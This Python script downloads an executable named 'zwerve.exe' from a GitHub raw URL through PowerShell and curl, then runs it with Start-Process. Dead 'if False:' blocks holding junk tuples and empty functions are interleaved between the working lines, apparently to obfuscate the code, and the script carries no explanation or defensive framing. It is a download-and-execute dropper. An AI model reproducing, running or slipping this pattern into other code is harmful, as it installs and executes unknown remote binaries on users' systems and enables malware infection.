import os
if False:
    _var_214_0 = (300, 694, 287)
    _var_214_1 = (685, 336, 924)
    _var_214_2 = (299, 872, 798)

    def _var_214_fn():
        pass
import subprocess
output_file = os.path.join(os.getcwd(), 'zwerve.exe')
if False:
    _var_215_0 = (396, 868, 507)

    def _var_215_fn():
        pass
download_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o "{output_file}"'
download_result = subprocess.run(['powershell', '-Command', download_command], capture_output=True, text=True)
print('Download Output:', download_result.stdout)
if False:
    _var_216_0 = (426, 629, 61)
    _var_216_1 = (165, 849, 526)

    def _var_216_fn():
        pass
print('Download Error:', download_result.stderr)
if download_result.returncode == 0 and os.path.exists(output_file):
    execute_command = f'Start-Process "{output_file}" -NoNewWindow -Wait'
    execute_result = subprocess.run(['powershell', '-Command', execute_command], capture_output=True, text=True)
    print('Execution Output:', execute_result.stdout)
    print('Execution Error:', execute_result.stderr)
else:
    print('File download failed or file not found.')
if False:
    _var_217_0 = (783, 38, 904)
    _var_217_1 = (955, 495, 870)
    _var_217_2 = (886, 202, 259)

    def _var_217_fn():
        pass